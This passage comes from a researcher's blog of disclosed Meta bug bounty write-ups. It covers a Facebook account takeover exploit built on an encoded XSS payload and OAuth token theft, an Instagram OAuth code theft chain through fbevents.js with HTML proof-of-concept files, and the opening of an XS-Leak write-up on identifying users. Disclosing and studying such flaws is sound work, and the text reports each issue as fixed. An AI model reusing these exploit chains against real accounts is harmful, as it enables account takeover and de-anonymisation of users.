                    <span class="nx">interv</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
                        <span class="k">try</span><span class="p">{</span>
                                <span class="c1">// Detect when the iframes are loaded</span>
                                <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">testing</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
                                <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                                    <span class="c1">// Load a data URL that sends the frame's name back to the parent</span>
                                    <span class="nx">ff</span> <span class="o">=</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x3chtml&gt;</span><span class="se">\</span><span class="s1">x3cbody&gt;</span><span class="se">\</span><span class="s1">x3cscript&gt;f={"code":1,"num":</span><span class="dl">'</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="dl">'</span><span class="s1">,"data":window.name};top.postMessage(f,"*")</span><span class="se">\</span><span class="s1">x3c/script&gt;</span><span class="se">\</span><span class="s1">x3c/body&gt;</span><span class="se">\</span><span class="s1">x3c/html&gt;</span><span class="dl">'</span><span class="p">;</span>
                                    <span class="nx">ff</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">ff</span><span class="p">);</span>
                                    <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nx">i</span><span class="p">].</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">data:text/html;base64,</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ff</span><span class="p">;</span>
                                <span class="p">}</span>
                                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">interv</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="k">catch</span><span class="p">{}</span>
                    
                    <span class="p">},</span> <span class="mi">1000</span> <span class="p">);</span>
                
          <span class="p">},</span> <span class="mi">20000</span> <span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* ==================== STEP 2 ==================== */</span>

        <span class="c1">// Check if the list of Math.random() values is complete</span>
        <span class="nx">listcheck</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">list_math_random</span><span class="p">).</span><span class="nx">length</span> <span class="o">&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">listcheck</span><span class="p">);</span>
                <span class="nf">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
                    <span class="nx">l</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">values</span><span class="p">(</span><span class="nx">list_math_random</span><span class="p">);</span>

                    <span class="c1">// Try to xss with different combinations until we get valid values from the server ( Z3 Solver can hang sometimes )</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
                    <span class="nf">start_xss</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">11</span><span class="p">));</span>
                    
                <span class="p">},</span><span class="mi">3000</span><span class="p">);</span>
            
                    
                <span class="p">}</span>
        <span class="p">},</span><span class="mi">2000</span><span class="p">);</span>
          
        <span class="cm">/* ==================== STEP 3 ==================== */</span>

        <span class="kd">function</span> <span class="nf">start_xss</span><span class="p">(</span><span class="nx">values_array</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nx">str</span> <span class="o">=</span> <span class="nx">values_array</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AbortController</span><span class="p">()</span>
            <span class="kd">const</span> <span class="nx">timeoutId</span> <span class="o">=</span> <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">controller</span><span class="p">.</span><span class="nf">abort</span><span class="p">()},</span> <span class="mi">5000</span><span class="p">)</span>
            
            <span class="c1">// Sends values to backend</span>
            <span class="nf">fetch</span><span class="p">(</span><span class="nx">BACKEND_URL</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">str</span><span class="p">,{</span> <span class="na">signal</span><span class="p">:</span> <span class="nx">controller</span><span class="p">.</span><span class="nx">signal</span> <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
                   <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
                       <span class="k">if</span><span class="p">(</span><span class="nx">response</span><span class="p">[</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">]</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">error</span><span class="dl">"</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
                       <span class="nx">data</span> <span class="o">=</span> <span class="nx">response</span><span class="p">[</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">];</span>
                       <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="p">);</span>
                       <span class="nx">tests</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                           <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">tests</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="c1">// we have a match let's try sending the message</span>
                        <span class="nx">callbacks</span> <span class="o">=</span> <span class="nf">guid</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nf">shift</span><span class="p">());</span>
                        
                        <span class="c1">// payload : &amp;lt;img src=x onerror='parent.postMessage("body:" + parent.frames[0].document.body.innerHTML,"*")'/&amp;gt;</span>
                        <span class="nx">xss_payload</span> <span class="o">=</span> <span class="nx">callbacks</span><span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;type=mpn.setupIconIframe&amp;frameName=test&amp;iconSVG=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%27%70%61%72%65%6e%74%2e%70%6f%73%74%4d%65%73%73%61%67%65%28%22%62%6f%64%79%3a%22%20%2b%20%70%61%72%65%6e%74%2e%66%72%61%6d%65%73%5b%30%5d%2e%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%2c%22%2a%22%29%27%2f%3e&amp;unreadCountCssText={}&amp;cssText={}&amp;availabilityStatusCssText={}&amp;greetingCssText={}</span><span class="dl">"</span><span class="p">;</span>

                        <span class="nx">target_frame</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                        <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="nx">xss_payload</span><span class="p">,</span> <span class="nx">target_frame</span><span class="p">)</span>


                        <span class="c1">// Receive OAuth token</span>
                        <span class="nx">onmessage</span><span class="o">=</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">body:</span><span class="dl">"</span><span class="p">)){</span>
                                <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">tests</span><span class="p">);</span>
                                <span class="nf">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">},</span><span class="mi">7000</span><span class="p">);</span>
                   <span class="p">});</span>
    
        <span class="p">}</span>

        <span class="cm">/* ==================== Functions ==================== */</span>

        <span class="kd">function</span> <span class="nf">toRandom</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">flt</span> <span class="o">=</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
            <span class="nx">fin</span> <span class="o">=</span> <span class="nx">flt</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">fin</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">flt</span> <span class="o">=</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nx">flt</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">);</span>
            
        <span class="p">}</span>
        <span class="kd">function</span> <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="nx">msg</span><span class="p">,</span><span class="nx">ifrm</span><span class="p">){</span>
            <span class="nx">target</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://secure.facebook.com</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">ifrm</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/plugins/feedback.php?api_key&amp;channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">msg</span><span class="p">)}</span><span class="s2">%26origin=</span><span class="p">${</span><span class="nx">target</span><span class="p">}</span><span class="s2">&amp;href=https%3A%2F%2Fwww.facebook.com%2Fbusiness%2Fnews%2F100-in-view-impressions-and-moat-partnership&amp;locale=en_US&amp;numposts=10&amp;order_by=time&amp;sdk=joey&amp;version=v2.3&amp;width=600&amp;_rdr`</span><span class="p">;</span>
            
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">parseFloat2</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="nx">cof</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">cof</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">str</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="nx">cof</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">parts</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span> <span class="nx">parts</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">/</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">pow</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nx">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">length</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>
        <span class="p">}</span>
        
        <span class="kd">function</span> <span class="nf">guid</span><span class="p">(</span><span class="nx">anystring</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="dl">"</span><span class="s2">f</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">anystring</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">)).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
                    <span class="p">}</span>


        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<h1 id="impact">Impact</h1>
<hr />
<p><br />
This vulnerability enables account takeover of Facebook account if the user visits a link inside Facebook Application in mobile.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Jun 22, 2023 — Bug reported</p>

<p>Jun 23, 2023 — Bug Acknowledged by Meta</p>

<p>Jun 28, 2023 — <strong>$66,000</strong> bounty awarded by Meta</p>

<p>Dec 15, 2023 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Facebook Javascript SDK and Facebook plugins]]></summary></entry><entry><title type="html">Instagram account takeover via Meta Pixel script abuse</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html" rel="alternate" type="text/html" title="Instagram account takeover via Meta Pixel script abuse" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html"><![CDATA[<h1 id="introduction">Introduction</h1>
<hr />
<p><br />
Meta’s web ecosystem relies on cross-window messaging between first-party websites.
In many cases, the only security control enforced is an origin check validating that messages originate from <code class="language-plaintext highlighter-rouge">facebook.com</code> or its subdomains.</p>

<p>This write-up describes how that assumption can be abused to steal first-party OAuth codes and generate first-party Instagram access tokens, ultimately enabling Instagram and Facebook account takeovers under realistic conditions.</p>

<p>The attack leverages a chain between a misconfigured Facebook endpoint and implicit trust in postMessage listeners such as in <code class="language-plaintext highlighter-rouge">fbevents.js</code>, which is widely deployed across Meta-owned and third-party websites.</p>

<h1 id="description">Description</h1>
<hr />
<h3 id="cross-window-trust-in-meta-javascript">Cross-Window Trust in Meta JavaScript</h3>

<p>Multiple Meta JavaScript modules register cross-window message listeners and trust incoming messages solely based on <code class="language-plaintext highlighter-rouge">event.origin</code> being <code class="language-plaintext highlighter-rouge">facebook.com</code> or one of its subdomains.</p>

<p>One such consumer is <code class="language-plaintext highlighter-rouge">fbevents.js</code>, the Meta Pixel script embedded on millions of websites.
When loaded in a window that has an <code class="language-plaintext highlighter-rouge">opener</code>, <code class="language-plaintext highlighter-rouge">fbevents.js</code> registers a message listener and reacts to specific message types by issuing requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>, including contextual data such as the current website’s <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code>. These values would contain sensitive artifacts such as OAuth authorization codes or stokens.</p>

<h3 id="abusing-facebookcomredacted-endpoint">Abusing facebook.com/REDACTED endpoint</h3>

<p>The message source in this chain is the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/REDACTED</code></p>

<p>This endpoint constructs an object from user-supplied parameters and forwards it via <code class="language-plaintext highlighter-rouge">postMessage</code> to a target Facebook domain specified by the attacker.</p>

<h3 id="chaining-with-fbeventsjs">Chaining with fbevents.js</h3>

<p>When <code class="language-plaintext highlighter-rouge">fbevents.js</code> receives a message originating from <code class="language-plaintext highlighter-rouge">facebook.com</code> and matching specific message types, it uses the supplied <code class="language-plaintext highlighter-rouge">access_token</code> in the message to issue requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>.</p>

<p>Crucially, the attacker fully controls this <code class="language-plaintext highlighter-rouge">access_token</code>. Meaning by supplying an attacker-owned Graph Explorer token, the resulting requests can later be inspected in the Graph Explorer history, where leaked values such as the victim’s OAuth code/token in the URL or <code class="language-plaintext highlighter-rouge">referrer</code> become visible.</p>

<h3 id="attack-scenario">Attack Scenario</h3>

<p>The following scenario targets <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which loads <code class="language-plaintext highlighter-rouge">fbevents.js</code> and hosts multiple OAuth callback endpoints for Instagram and Threads.</p>

<p>An example OAuth authorization request initiated by the attacker:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/authorize/third_party?
<span class="err">&amp;</span>app_id=200289238967899
<span class="err">&amp;</span>redirect_uri=https://developers.facebook.com/instagram/token_generator/oauth/
<span class="err">&amp;</span>response_type=code
<span class="err">&amp;</span>scope=user_profile,user_media
<span class="err">&amp;</span>state={"app_id":"200289238967899","nonce":"WRONG_NONCE","user_id":"1"}
</code></pre></div></div>
<p>Using an invalid nonce causes the flow to land on an error page at <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which still loads <code class="language-plaintext highlighter-rouge">fbevents.js</code>.</p>

<p>Because the window has an opener, <code class="language-plaintext highlighter-rouge">fbevents.js</code> initializes its message listener.</p>

<p>At this point, the attacker redirects attacker website to:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/REDACTED/?
<span class="err">&amp;</span>graphToken=ATTACKER_EXPLORER_TOKEN
<span class="err">&amp;</span>msg_type=FACEBOOK_IWL_BOOTSTRAP
<span class="err">&amp;</span>pixelID=438056466377696
<span class="err">&amp;</span>sessionStartTime=1668626372000
</code></pre></div></div>

<p>This causes <code class="language-plaintext highlighter-rouge">www.facebook.com</code> to send a crafted message to the <code class="language-plaintext highlighter-rouge">opener</code> (developers.facebook.com) window under a trusted origin. <code class="language-plaintext highlighter-rouge">fbevents.js</code> consumes the message and issues Graph API requests using the attacker-controlled token, embedding <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code> in these requests.</p>

<p>By inspecting the attacker token’s history in Graph Explorer, the attacker can retrieve the Instagram OAuth authorization code and referrer data.</p>

<h3 id="generating-a-first-party-instagram-access-token">Generating a First-Party Instagram Access Token</h3>

<p>The stolen code can be exchanged for a first-party Instagram access token by abusing the following endpoint:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developers.facebook.com/instagram/short_lived_access_token/oauth/?
<span class="err">&amp;</span>code=VICTIM_CODE
<span class="err">&amp;</span>state={"app_id":"FIRST_PARTY_APP","nonce":"YOUR_NONCE","user_id":"1"}
</code></pre></div></div>

<p>This returns a first-party Instagram access token, even when the code was generated by a different application. This in itself was a critical bug however Meta refused to acknowledge it and then later fixed it in secret.</p>

<h3 id="poc">PoC</h3>
<p><strong>index.html:</strong></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
Put your access_token in URL fragment and refresh (nothing is logged)
<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"window.name='test';window.open('second.html' + location.hash)"</span><span class="nt">&gt;</span>Start Attack<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><strong>second.html</strong></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">wait.html</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://www.instagram.com/oauth/authorize/third_party/?redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Finstagram%2Ftoken_generator%2Foauth%2F&amp;response_type=code&amp;scope=user_profile&amp;app_id=17951132926087090&amp;logger_id=02f8edcd-6353-454e-80c3-ec5c4e496bd2&amp;state={"app_id":1,"nonce":"somethingwrong"}</span><span class="dl">'</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<p><strong>wait.html</strong></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="k">try</span><span class="p">{</span>
    <span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
    <span class="nx">opener</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">ping</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/REDACTED/?graphToken=</span><span class="p">${</span><span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">||</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">))}</span><span class="s2">&amp;msg_type=FACEBOOK_IWL_BOOTSTRAP&amp;pixelID=438056466377696&amp;sessionStartTime=1668626372000&amp;`</span><span class="p">}</span>
    <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">catch</span><span class="p">{}</span>
<span class="p">},</span><span class="mi">100</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h1 id="impact">Impact</h1>
<hr />
<p><br />
This vulnerability enables theft of first-party Instagram OAuth codes, generation of first-party access tokens, Instagram account takeover.</p>

<p>Because fbevents.js is widely deployed, the attack surface extends beyond Meta properties to third-party websites.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Oct 16, 2024 — Bug reported</p>

<p>Oct 16, 2024 — Bug Acknowledged by Meta</p>

<p>Oct 24, 2024 — Bug fixed by Meta</p>

<p>Feb 12, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains.]]></summary></entry><entry><title type="html">Multiple cross-site leaks disclosing Facebook users in third-party websites</title><link href="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html" rel="alternate" type="text/html" title="Multiple cross-site leaks disclosing Facebook users in third-party websites" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html"><![CDATA[<h1 id="introduction">Introduction</h1>
<hr />
<p><br />
This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.</p>

<p>While none of these bugs directly grant account control on their own, they enable precise user identification, de-anonymization, and cross-context fingerprinting. When chained with other vulnerabilities, these primitives significantly lower the bar for targeted attacks, account takeover, and employee profiling.</p>

<p>Each section below documents a distinct class of XS-Leak, grouped by affected surface and leakage primitive.</p>

<h3 id="xs-leak-identifying-the-current-workplace--meta-work-user">XS-Leak: Identifying the Current Workplace / Meta Work User</h3>
<hr />
<p><br />
This issue allows distinguishing the currently logged-in Workplace user by abusing response-type differences in Zoom callback endpoints.</p>

<p>By loading the following endpoints in a script context:</p>

<ul>
  <li>https://work-api.workplace.com/zoom/callback/</li>
  <li>https://work-api.facebook.com/zoom/callback/</li>
</ul>

<p>and supplying both <code class="language-plaintext highlighter-rouge">__cid</code> (community ID) and <code class="language-plaintext highlighter-rouge">__user</code> parameters, an attacker can brute-force the user ID within a known Workplace community.</p>

<p>When <code class="language-plaintext highlighter-rouge">__user</code> is correct for the active session, the endpoint responds with an empty page and <code class="language-plaintext highlighter-rouge">Content-Type: text/html</code>, which can be loaded successfully via a script tag.<br />
When incorrect, the response is <code class="language-plaintext highlighter-rouge">application/json</code>, triggering CORB and blocking script execution.</p>

<p>By observing <code class="language-plaintext highlighter-rouge">onload</code> versus <code class="language-plaintext highlighter-rouge">onerror</code> events, the attacker can reliably determine whether a given user ID matches the currently logged-in Workplace user.</p>

<p>This works across all major browsers for Workplace. For Facebook users, the same technique only works inside the Facebook app webview, where <code class="language-plaintext highlighter-rouge">__cid</code> is not properly validated.</p>

<h3 id="xs-leak-identifying-the-active-facebook-user-or-page">XS-Leak: Identifying the Active Facebook User or Page</h3>
<hr />
<p><br />
This issue abuses Facebook plugin behavior to distinguish the currently logged-in Facebook user or page.</p>

<p>By embedding a Facebook plugin (such as the Like plugin) inside an iframe and supplying both <code class="language-plaintext highlighter-rouge">__a=1</code> and a candidate <code class="language-plaintext highlighter-rouge">__user</code> ID, different behavior is observed depending on whether the supplied ID matches the active session.</p>

<p>If the <code class="language-plaintext highlighter-rouge">__user</code> value is correct, the iframe successfully loads and sends a postMessage to the parent window.   If incorrect, the response includes <code class="language-plaintext highlighter-rouge">X-Frame-Options: deny</code>, preventing the iframe from loading.</p>

<p>This distinction allows brute-forcing the active user or page ID by observing postMessage events versus timeouts.</p>

<p>This technique works for both personal profiles and pages and does not require any special permissions beyond the victim being logged into Facebook.</p>

<h2 id="poc">PoC</h2>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"0"</span> <span class="na">height=</span><span class="s">"0"</span> <span class="na">id=</span><span class="s">"test"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
